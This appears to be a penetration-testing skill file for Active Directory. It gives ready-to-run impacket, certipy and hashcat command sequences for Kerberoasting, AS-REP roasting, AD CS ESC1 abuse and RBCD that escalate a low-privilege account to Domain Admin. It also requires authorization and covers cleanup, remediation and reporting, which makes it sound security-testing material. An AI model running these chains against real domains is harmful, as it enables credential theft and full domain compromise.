---
name: active-directory
description: 'Active Directory testing for Kerberos roasting, delegation abuse, AD CS ESC paths, NTLM coercion and DACL abuse. Triggers: Active Directory, Kerberos, "AD စစ်", ESC1, "domain admin", "roast".'
category: post-exploitation
track: 06-post-exploitation
tags: [ad, kerberos, adcs, ntlm, delegation]
severity_ceiling: critical
requires: [authenticated-session, local-lab]
tools: [impacket-secretsdump, impacket-wmiexec, smbclient, enum4linux]
cwe: CWE-269
owasp: []
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# Active Directory

## 1. Preconditions

- A domain-joined lab or an engagement with **explicit written** authorization for AD attack
  paths, including whether credential dumping and coercion are permitted.
- A low-privilege domain account (the realistic starting point), plus its NTLM hash for
  pass-the-hash testing if approved.
- This environment ships `impacket-*` CLI tools (`impacket-secretsdump`, `impacket-wmiexec`,
  `impacket-rpcdump`, `impacket-samrdump`, `impacket-netview`, `impacket-getTGT`,
  `impacket-GetUserSPNs`, `impacket-GetNPUsers`, `impacket-getST`). `enum4linux` and
  `smbclient` are present. BloodHound, NetExec (`nxc`) and `certipy` are **not** installed —
  install them in your own tooling VM or plan around them; do not assume they exist.

## 2. Gate

Establish domain context and a Kerberos ticket before anything destructive:

```bash
DC=dc01.corp.local
enum4linux -a "$DC" 2>/dev/null | head -40
impacket-rpcdump "$DC" | head -20
# request a TGT as the low-priv user
impacket-getTGT corp.local/lowuser:'Password1' -dc-ip "$DC"
export KRB5CCNAME=lowuser.ccache
```

**Pass (finding):** a path from the low-priv account to a higher-privilege principal, proven by
a ticket or an authenticated call — not by a scanner label. **Fail:** every path is blocked by
patching, tiering, or LAPS.

## 3. Enumeration

```bash
# users, groups, SPNs (Kerberoastable)
impacket-GetUserSPNs corp.local/lowuser:'Password1' -dc-ip "$DC" -request -outputfile spn.txt
# AS-REP roastable (no preauth)
impacket-GetNPUsers corp.local/ -dc-ip "$DC" -usersfile users.txt -no-pass -format hashcat
# delegation
impacket-findDelegation corp.local/lowuser:'Password1' -dc-ip "$DC"
# AD CS (if certipy is available; otherwise enumerate via RPC/LDAP)
certipy find -u lowuser@corp.local -p 'Password1' -dc-ip "$DC" -vulnerable
# shares
smbclient -L "//$DC" -U 'corp.local\lowuser%Password1'
```

ESC paths to look for: **ESC1** (enrollee-supplied SAN + client-auth EKU), **ESC2** (any
purpose), **ESC3** (enrollment agent), **ESC4** (writable template), **ESC8** (NTLM relay to
HTTP enrollment), **ESC11** (relay to ICPR), **ESC13/15/16** (OID group link, PA auth, alt
template). Delegation: unconstrained, constrained, RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`).

## 4. Test Matrix

| # | Path | Tool | Pass signal |
|---|---|---|---|
| 1 | Kerberoast | `GetUserSPNs -request` | crackable TGS |
| 2 | AS-REP roast | `GetNPUsers` | crackable AS-REP |
| 3 | Password spray | `nxc smb` (if available) or `hydra` | valid creds |
| 4 | AD CS ESC1 | `certipy req -upn admin` | cert as admin |
| 5 | AD CS ESC8 | relay to `/certsrv` | cert |
| 6 | RBCD | write `msDS-AllowedToActOnBehalfOfOtherIdentity` | S4U2Proxy ticket |
| 7 | DACL | `GenericAll` on a group | add member |
| 8 | Coerce + relay | PetitPotam/PrinterBug → relay | auth as machine |

## 5. Proof

```bash
# 1. Kerberoast and crack offline (bounded)
impacket-GetUserSPNs corp.local/lowuser:'Password1' -dc-ip "$DC" -request -outputfile spn.txt
hashcat -m 13100 spn.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# 2. AD CS ESC1
certipy req -u lowuser@corp.local -p 'Password1' -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip "$DC"
certipy auth -pfx administrator.pfx -dc-ip "$DC"     # yields a TGT

# 3. RBCD (needs write on the target computer object)
impacket-addcomputer corp.local/lowuser:'Password1' -computer-name 'KKPROOF$' -computer-pass 'P@ss123!' -dc-ip "$DC"
impacket-rbcd corp.local/lowuser:'Password1' -action write -delegate-to 'TARGET$' \
  -delegate-from 'KKPROOF$' -dc-ip "$DC"
impacket-getST corp.local/'KKPROOF$':'P@ss123!' -spn cifs/target.corp.local -impersonate administrator -dc-ip "$DC"

# 4. verify the resulting access, minimally
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass administrator@target.corp.local 'whoami'
```

**Cleanup is mandatory:** remove the added computer account, revert the RBCD attribute, delete
issued certificates where possible, and note anything you could not revert.

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| The low-priv account is actually in Domain Admins | `whoami /groups` |
| The SPN hash cracked because of a test password | Confirm the account is a real user, not a decoy |
| ESC1 template requires approval | Try the request; a pending-approval error means blocked |
| RBCD write succeeded but S4U2Proxy fails | Requires the full ticket chain; a failure is "not exploitable" |
| The relay worked but the certificate is unusable | `certipy auth` must yield a TGT |
| BloodHound said so but the path is blocked by tiering | Reproduce the actual step |

## 7. Impact

Domain privilege escalation to Domain Admin or equivalent. State the shortest proven path and
its steps, plus what you actually accessed (one host, one file, one group membership).

## 8. CVSS 3.1

```text
Low-priv user → Domain Admin:      CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.0
Kerberoastable service account (weak pw): 8.0
AD CS ESC1 as low-priv user:       CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9
Password spray success on one user: 6.5
```

`AV:A` is correct for on-network Kerberos paths; use `AV:N` only for a remotely reachable
service (AD CS Web Enrollment, VPN).

## 9. Report

```markdown
# AD CS template `VulnTemplate` (ESC1) allows any user to enroll as Domain Admin

**Severity:** Critical (CVSS 3.1: 9.9 — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
**Affected asset:** corp.local CA `CORP-CA`, template `VulnTemplate`
**Category:** CWE-269 · AD CS misconfiguration
```

## 10. Remediation

- **ESC1/ESC2:** remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`; require manager approval; restrict
  enrollment to specific groups.
- **ESC8/ESC11:** enable EPA and HTTPS on enrollment endpoints; disable NTLM where possible.
- **Kerberoast:** rotate service account passwords to 25+ random chars (gMSA); remove unused SPNs.
- **AS-REP:** enable Kerberos pre-authentication on all accounts.
- **RBCD/delegation:** audit `msDS-AllowedToActOnBehalfOfOtherIdentity`; restrict who can write it.
- **Coercion:** patch (PetitPotam/PrinterBug), enable SMB signing and LDAP signing/channel binding.
- Tier admins: no Domain Admin logon on workstations; use PAWs and LAPS.
- Monitor 4768/4769/4624/4662 and certificate requests for anomalies.

Regression test: `certipy find -vulnerable` returns no ESC paths; all SPN accounts use gMSA.

## 11. References

- Microsoft — AD CS security guidance; KB5014754 (strong cert mapping)
- MITRE ATT&CK — T1558 (Steal or Forge Kerberos Tickets), T1649
- Certified Pre-Owned (SpecterOps) — AD CS attack paths
